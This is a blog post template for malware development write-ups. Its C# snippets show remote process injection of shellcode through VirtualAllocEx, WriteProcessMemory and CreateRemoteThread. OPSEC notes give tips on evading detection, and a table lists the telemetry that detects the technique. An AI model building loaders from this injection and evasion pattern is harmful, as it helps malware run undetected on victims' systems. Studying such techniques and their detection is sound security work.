---
title: "Template: Malware Development Post"
date: 2026-06-17 00:00:00 +0000
categories: [Malware Development, Loaders]
tags: [csharp, shellcode, injection, windows, evasion]
toc: true
# image:
#   path: /assets/img/posts/your-banner.png
#   alt: "Post banner description"
---

## Overview

Brief summary: what the technique is, what it bypasses, and why it matters.

## Background

Context, prior art, and relevant Windows internals or APIs.

## Implementation

### Step 1 — Allocate Memory

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr VirtualAllocEx(
    IntPtr hProcess,
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect);

IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)shellcode.Length,
    0x3000, // MEM_COMMIT | MEM_RESERVE
    0x40);  // PAGE_EXECUTE_READWRITE
```

### Step 2 — Write + Execute

```csharp
WriteProcessMemory(hProc, addr, shellcode, (uint)shellcode.Length, out _);
CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out _);
```

## OPSEC Notes

- Avoid `PAGE_EXECUTE_READWRITE` in production — allocate RW, write, then flip to RX
- Prefer `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` over Win32 equivalents
- Consider stomping a legitimate module's `.text` section instead of a fresh allocation

## Detection

| Signal | Source |
|---|---|
| `VirtualAllocEx` RWX on remote proc | Microsoft-Windows-Threat-Intelligence ETW |
| `CreateRemoteThread` cross-process | Sysmon Event ID 8 |
| PE regions not backed by file on disk | MDE memory scanning |

## References

- [MITRE ATT&CK T1055 — Process Injection](https://attack.mitre.org/techniques/T1055/)
- Add your references here
